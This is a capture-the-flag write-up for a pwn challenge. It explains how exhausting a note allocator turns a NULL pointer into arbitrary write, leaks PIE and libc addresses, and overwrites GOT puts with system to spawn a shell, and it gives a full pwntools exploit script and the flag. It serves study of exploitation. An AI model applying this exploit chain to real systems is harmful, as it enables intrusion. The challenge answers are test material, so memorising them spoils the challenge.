---
description: Application Logic, Arbitrary Write, GOT Overwrite
---

# well\_known

## Problem

This challenge is personally one of the most I’ve had in a while. Combining some techniques that I’ve previously learned while also learning new techniques and concepts in the way.

<details>

<summary>Description</summary>

Every pwn technique is just old and well known

`nc 23.94.73.203 9898`

</details>

<details>

<summary>tldr;</summary>

1. Leaking and calculating base address bypassing PIE
2. Exploiting vulnerable application logic
3. Overwriting memory to contain _<mark style="color:green;">**/bin/sh**</mark>_ string
4. Leaking and calculating base address of Libc
5. Overwriting GOT entry to gain shell

</details>

## Solution

### Analysis

Given a binary _<mark style="color:green;">**chall**</mark>_ and _<mark style="color:green;">**libc**</mark>_, the first thing we will do is to check the binary type and its security implementation.

```bash
$ file chall    
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped

$ checksec --file=chall    
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable    FILE
No RELRO        Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols        Yes   1               3     chall
```

basic analysis summary:

* _<mark style="color:green;">**x64 least-bit ELF**</mark>_ binary
* _<mark style="color:green;">**dynamically linked,**</mark>_ so it’ll depend on system library
* _<mark style="color:green;">**stripped,**</mark>_ means function and variable name from the source code is not carried
* _<mark style="color:red;">**No RELRO**</mark><mark style="color:green;">,</mark>_ means that the GOT entry table writeable
* _<mark style="color:green;">**Stack Canary,**</mark>_ which means there’s additional checks into each function calls if the stack is overflown
* _<mark style="color:green;">**NX enabled**</mark>_<mark style="color:green;">,</mark> means the stack is not executable
* _<mark style="color:green;">**PIE enabled,**</mark>_ means that the base address of the program is randomized for each running processes

since by default the compiler will apply <mark style="color:orange;">**PARTIAL RELRO**</mark> to the compiled binary, and indication of <mark style="color:red;">**No RELRO**</mark> here is a big hint that we’ll doing some GOT overwrite to solve this challenge

Next, let’s try to decompile the binary, below is the relevant code snippet that ghidra has decompiled and I’ve tidied up and renamed some of the function and variable names.

<details>

<summary><em><mark style="color:green;"><strong>main()</strong></mark></em></summary>

{% code lineNumbers="true" %}
```c
void main(void){
  long in_FS_OFFSET;
  int choice;
  undefined8 local_10;
  choice = 0;
  load_banner();
  init();
  while( true ) {
    while( true ) {
      while( true ) {
        while( true ) {
          menu();
          __isoc99_scanf("%d",&choice);
          getc(stdin);
          if (choice != 3) break;
          show_note();
        }
        if (choice < 4) break;
        if (choice != 4) goto LAB_00101627;
        delete_note();
      }
      if (choice != 1) break;
      new_note();
    }
    if (choice != 2) break;
    edit_note();
  }
LAB_00101627:
  puts("Invalid option!");
  exit(0);
}

```
{% endcode %}

</details>

from this _<mark style="color:green;">**main()**</mark>_ section, we get an idea that the program will loop over throughout its execution. Each loop will print out a banner and a menu  displaying a function that the user can prompt with an input ranging from 1 to 4.

<details>

<summary><em><mark style="color:green;"><strong>menu()</strong></mark></em></summary>

{% code lineNumbers="true" %}
```c
void menu(void){
  puts(&target);
  puts("1. New note");
  puts("2. Edit note");
  puts("3. Show note");
  puts("4. Delete note");
  __printf_chk(1,&DAT_00102164);
  return;
}

```
{% endcode %}

</details>

This _<mark style="color:green;">**menu()**</mark>_ function simply prints out the menu and you might notice I have renamed one of the global variable with _<mark style="color:green;">**target**</mark>_ which currently holds nothing. This will be relevant to our exploitation as I will explain later on.

<details>

<summary><em><mark style="color:green;"><strong>new_note()</strong></mark></em></summary>

{% code lineNumbers="true" %}
```c
void new_note(void){
  note_addr = (char *)allocate_note();
  if (note_addr == (char *)0x0) {
    __printf_chk(1,"[!] Error, not enough memory");
  }
  else {
    __printf_chk(1,"Content: ");
    fgets(note_addr,256,stdin);
  }
  return;
}

```
{% endcode %}

</details>

<details>

<summary><em><mark style="color:green;">allocate_note()</mark></em></summary>

{% code lineNumbers="true" %}
```c
long allocate_note(void){
  long mem_address;
 
  mem_address = memory_address;
  if ((lower_bound != 0) && (upper_bound < 17)) {
    (&vmmap)[upper_bound] = memory_address;
    memory_address = memory_address + 0x100;
    lower_bound = lower_bound + -1;
    upper_bound = upper_bound + 1;
    return mem_address;
  }
  puts("Error: Not enough available memory.");
  return 0;
}

```
{% endcode %}

</details>

In this snippet, if the user prompts the program with the input of 1, it will allocate a new memory and store its address in _<mark style="color:green;">**note\_addr**</mark>_ global variable. Each time we request (or make a new note), it will allocate a new memory address + 0x100 of its previous memory. We can make up to 16 notes before it hits a limit and can’t allocate anymore memory. Note that there’s a check to the offset we gave so we won’t be able to give negative offsets.

<details>

<summary><em><mark style="color:green;"><strong>show_note()</strong></mark></em></summary>

{% code lineNumbers="true" %}
```c
void show_note(void){
  if (note_addr == -1) {
    puts("No active note, create a new note in order to view it");
  }
  else {
    __printf_chk(1,"Content: %s");
  }
  return;
}
```
{% endcode %}

</details>

the _<mark style="color:green;">**show\_note()**</mark>_  function simply prints out the the content of the memory pointed by the _<mark style="color:green;">**note\_addr**</mark>_ global variable

<details>

<summary><em><mark style="color:green;"><strong>edit_note()</strong></mark></em></summary>

{% code lineNumbers="true" %}
```c
void edit_note(void){
  int iVar1;
  long lVar2;
  long in_FS_OFFSET;
  long offset;
  long local_10;
 
  offset = 0;
  if (note_addr == -1) {
    __printf_chk(1,"[!] Create a note first");
  }
  else {
    __printf_chk(1,"Offset: ");
    __isoc99_scanf("%ld",&offset);
    getc(stdin);
    if (offset < 0) {
      puts("[!] Invalid offset.");
    }
    else {
      __printf_chk(1,"[*] You are editing the following part of the note at offset %ld:\n----\n");
      fwrite((void *)(offset + note_addr),1,0x10,stdout);
      puts("\n----");
      __printf_chk(1,"[>] New content(up to 16 chars): ");
      lVar2 = 0;
      do {
        iVar1 = getc(stdin);
        if ((char)iVar1 == '\n') break;
        *(char *)(lVar2 + note_addr + offset) = (char)iVar1;
        lVar2 = lVar2 + 1;
      } while (lVar2 != 0x10);
    }
  }
}

```
{% endcode %}

</details>

The _<mark style="color:green;">**edit\_note()**</mark>_ function allows us to write up to 16 bytes into an offset of our notes (pointed by _<mark style="color:green;">**note\_addr**</mark>_). Before allowing us to write, it will also print out 16 bytes of the content of said offset.

<details>

<summary><em><mark style="color:green;">delete_note()</mark></em></summary>

{% code lineNumbers="true" %}
```c
void delete_note(void){
  __printf_chk(1,"[delete_note@%p] :: Not yet implemented\n",delete_note);
  return;
}
```
{% endcode %}

</details>

The _<mark style="color:green;">**delete\_note()**</mark>_ function simply is not implemented yet, however it leaks out its address, this will be beneficial for us to bypass the PIE since, even though the base address is randomized, the offset is always the same. Grabbing the offset from ghidra&#x20;

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 143741.png" alt="" width="488"><figcaption></figcaption></figure>

we can calculate the offset to its base address using the following formula:

_<mark style="color:blue;">**`base_address = delete_note - offset`**</mark>_

we can verify this in _<mark style="color:green;">**gdb-pwndbg**</mark>_:

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 143808.png" alt="" width="563"><figcaption><p>running option 4 to leak address</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 143859.png" alt="" width="563"><figcaption><p>calculating offset to gain base address</p></figcaption></figure>

Using the same technique, we can also calculate the address of note\_addr to gain the address of out notes and monitor how it is evolved

_<mark style="color:blue;">**`note_addr = base_addr + offset`**</mark>_

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 144431.png" alt="" width="337"><figcaption><p>note_addr offset</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 144404.png" alt="" width="563"><figcaption><p>initializing a note</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 144552.png" alt="" width="563"><figcaption><p>seeing the contents</p></figcaption></figure>

### Exploitation

What comes to my mind the first time is to overwrite the GOT entries with a call to _**system()**_. However after comparing where the address of our notes starts with the address of the GOT….

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 145000.png" alt=""><figcaption><p>GOT Table Addresses</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 144939.png" alt=""><figcaption><p>vmmap memory sections</p></figcaption></figure>

we reveal that note starts at _<mark style="color:purple;">**0x00007ffff7fc2000**</mark>_ (using the same address and technique explained above) however the GOT is located around at _<mark style="color:purple;">**0x555555557000**</mark>_ which is way back, means that it requires us to give a negative offset which is not possible.

Next thing comes into my mind is to write into a memory both writable and executable however, as the _<mark style="color:green;">**vmmap**</mark>_ shows, there’s no such memory section. Next is to overwrite the return pointer in the stack, that too is not possible since we didn’t get any stack base address leak. Next, I try to smash the notes by requesting as many notes until it hits its limit. And after inspecting what _<mark style="color:green;">**note\_addr**</mark>_ holds after we smash it, I found something very interesting…

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 145806.png" alt=""><figcaption><p>note smashed to its limit</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 145832.png" alt="" width="545"><figcaption><p>the content of <em><mark style="color:green;"><strong>note_addr</strong></mark></em></p></figcaption></figure>

Notice now the _<mark style="color:green;">**note\_addr**</mark>_ doesn't not point to anything. this is because if the _<mark style="color:green;">**allocate\_note()**</mark>_ function is unable to allocate more memory, it will return _<mark style="color:red;">**NULL**</mark>_, thus emptying the _<mark style="color:green;">**note\_addr**</mark>_. This basically gains us arbitrary write to almost anywhere in the memory of the process including to the GOT because of this code in the _<mark style="color:green;">**edit\_note()**</mark>_ function:

_<mark style="color:blue;">**`*(char *)(lVar2 + note_addr + offset) = (char)iVar1;`**</mark>_

and because _<mark style="color:green;">**note\_addr**</mark>_ is _<mark style="color:red;">**NULL**</mark>_, we can just supply our offset as the address we want to write to. Now our attack vector is clear, is to replace one of the library within GOT to the address _<mark style="color:green;">**system()**</mark>_ with said library function is also calling one argument that we are also able to overwrite to _<mark style="color:green;">**/bin/sh**</mark>_.

We can figure this out by taking any first argument of any function that exists within got and try to calculate the address of its first argument by calculating the sum of the base address and its offset and locate which section it belongs to in the process memory by using _<mark style="color:green;">**vmmap**</mark>_. For example, I will be taking the first argument of the calls to _<mark style="color:green;">**puts()**</mark>_ in _<mark style="color:green;">**show\_note()**</mark>_ function.

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 151249.png" alt="" width="563"><figcaption><p>offset</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 151604.png" alt="" width="563"><figcaption><p>memory address</p></figcaption></figure>

and as we can see the memory of said address falls under the section that is not-writable. Eventually we’ll found that the first call to _<mark style="color:green;">**puts()**</mark>_ in the _<mark style="color:green;">**menu()**</mark>_ function is using a memory that is writable, and that is exactly the global address of _<mark style="color:green;">**target**</mark>_ that I briefly mentioned above. which also coincidentally is the first call to _<mark style="color:green;">puts()</mark>_ after the edit function has returned. This is perfect since it avoids any potential error.

Next, since we want to overwrite the GOT _puts_ with _<mark style="color:green;">**system()**</mark>_, we also need a leak for libc to calculate the libc base address. Thankfully upon calling the edit function and providing it with the address of GOT (calculated with the same technique explained above, base\_address + the corresponding GOT function offset) it will also prints out its contents, leaking the libc _<mark style="color:green;">**puts()**</mark>_ address.

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 153002.png" alt="" width="563"><figcaption><p>leaked libc puts</p></figcaption></figure>

new we can calculate the libc base address and the address to system with grabbing the offset by the machine libc provided in the challenge using the following:

_<mark style="color:blue;">**`libc_base = libc_puts - offset`**</mark>_

_<mark style="color:blue;">**`libc_system= libc_base + offset`**</mark>_

Great so to recap, our strategy is:

1. gain base address by leaking the _<mark style="color:green;">**delete\_note()**</mark>_ function
2. smash the note memory until it won’t be able to allocate more memory
3. replace the contents of the _<mark style="color:green;">**target**</mark>_ global variable with _<mark style="color:green;">**/bin/sh**</mark>_ string
4. edit the _<mark style="color:orange;">**GOT puts**</mark>_, leaking libc _<mark style="color:green;">**puts()**</mark>_, calculate libc base address and libc _<mark style="color:green;">**system()**</mark>_
5. replace the GOT puts entry with libc _<mark style="color:green;">**system()**</mark>_
6. gain shell

<details>

<summary><em><mark style="color:green;"><strong>Solve Script</strong></mark></em></summary>

{% code title="Exploit.py" lineNumbers="true" %}
```python
#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc-2.31.so'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '23.94.73.203', 9898

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

def new_note(content):
    io.sendlineafter(b'>>', b'1')
    io.sendline(content.encode())

def edit_note(offset, payload):
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', str(offset).encode())
    io.sendafter(b'(up to 16 chars):', payload)

def show_note():
    io.sendlineafter(b'>>', b'3')

def delete_note():
    io.sendlineafter(b'>>', b'4')
    return int(io.recvuntil(b']')[14:-1], 16)

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()
rop = ROP(exe)

# leaking addresses
leak = delete_note()
elf.address = leak - 0x11f9
note_ptr = elf.address + 0x3718

# initializing note and emptying address pointer to gain arbritrary write everywhere
for i in range(17):
    new_note('AAAA')
io.sendline(b'3')

# payload to leak got puts()
offset = elf.address + 0x3740
edit_note(offset, flat(elf.got['puts']))

# padding
io.sendline(b'3')

# receiving and formatting got puts address
got_puts = unpack(io.recvline()[:-1].strip().ljust(8, b'\x00'))

# payload to overwrite first puts in menu() parameter string to '/bin/sh'
offset = elf.address + 0x3740
edit_note(offset, flat(b'/bin/sh\x00'))

# padding
io.sendline(b'3')

# leaking libc puts function 
offset = elf.got['puts']
io.sendlineafter(b'>>', b'2')
io.sendlineafter(b':', str(offset).encode())
io.recvlines(2)
puts_func = unpack(io.recvline()[:6].ljust(8, b'\x00'))

# receiving and calculating libc offsets
libc.address = puts_func - 0x84420
system = libc.address +  0x52290    

# log address info
info('leak: %#x', leak)
info('main base: %#x', elf.address)
info('note ptr: %#x', note_ptr)
info('program binsh: %#x', elf.address + 0x3740)

# log libc findings
info('leaked got puts: %#x', got_puts)
info('libc base: %#x', libc.address)
info('system: %#x', system)
info('puts function: %#x', puts_func)

# sending last payload
io.sendafter(b'(up to 16 chars):', flat(system))

# gained shell?
io.interactive()
```
{% endcode %}

</details>

## Flag

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 153841.png" alt="" width="395"><figcaption><p>gained shell and read flag</p></figcaption></figure>

> _**flag{wow\_u\_learn\_a\_lot}**_
>
> _\*Indeed I learned very much a lot, thank you :3_
